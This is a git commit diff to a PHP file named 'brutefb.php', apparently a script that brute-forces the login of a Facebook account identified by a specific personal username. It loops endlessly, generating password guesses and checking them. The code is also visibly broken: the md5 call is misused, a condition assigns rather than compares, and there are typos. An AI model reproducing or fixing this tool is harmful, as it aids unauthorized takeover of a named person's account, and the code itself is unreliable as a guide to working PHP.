8870bff84903c050aa2af814bf70c9ae5b96f1a1
x0rLS <42499784+x0rLS@users.noreply.github.com>
2018-09-15 14:30:04 +0200

    Update brutefb.php

--- brutefb.php
+++ brutefb.php
@@ -6,7 +6,7 @@ $time = microtime() * 100000;
 $username = "charlotte.scheurleer1";
 echo "https://twitter.com/LizardL4nds";
 while(True) {
-        $Pass = md5('{$time}', mt_rand());
+        $Pass = md5($time, mt_rand());
         if(check_correct($username, $Pass)) {
             if ($str = $startpagina) {
             die("<table cellpadding='0' cellspacing='0' boreder='1' align='center' class='raster_table' width='75%'>
